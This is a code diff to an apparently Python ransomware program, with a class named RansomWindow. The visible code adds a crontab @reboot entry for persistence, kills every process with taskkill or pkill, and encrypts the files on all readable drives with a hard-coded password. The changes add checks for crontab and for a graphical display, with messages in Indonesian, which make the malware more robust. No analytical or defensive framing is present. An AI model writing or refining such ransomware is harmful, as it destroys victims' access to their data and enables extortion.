@@ -16,7 +16,7 @@ class RansomWindow(Frame):
     def __init__(self, master: Tk):
         super().__init__(master)
         self.pack()
-        
+
         monitor = get_monitors()[0]
         screen_width = monitor.width
         screen_height = monitor.height
@@ -112,6 +112,9 @@ def add_to_startup_and_admin():
         script_path = os.path.abspath(sys.argv[0])
         cron_command = f'@reboot /usr/bin/python3 {script_path}\n'
         try:
+            if subprocess.run(['which', 'crontab'], capture_output=True, text=True).returncode != 0:
+                print("crontab tidak ditemukan. Silakan instal crontab terlebih dahulu.")
+                return
             with open('/tmp/cron_job', 'w') as cron_file:
                 cron_file.write(cron_command)
             subprocess.run(['crontab', '/tmp/cron_job'], check=True)
@@ -123,7 +126,7 @@ def close_all_tasks():
     if platform.system() == "Windows":
         os.system("taskkill -t -f -im *")
     else:
-        os.system("pkill -9 -e *")
+        os.system("pkill -9 $(whoami)")
 
 def encrypt_file(file_path, password):
     salt = os.urandom(16)
@@ -155,6 +158,9 @@ def get_all_drives():
     return [drive.device for drive in psutil.disk_partitions() if os.access(drive.device, os.R_OK)]
 
 def main():
+    if not os.getenv("DISPLAY") and platform.system() != "Windows":
+        print("Tkinter tidak dapat berjalan di lingkungan tanpa antarmuka grafis.")
+        sys.exit(1)
     add_to_startup_and_admin()
     close_all_tasks()
     encrypt_all_files(b"x0118ichimoci")
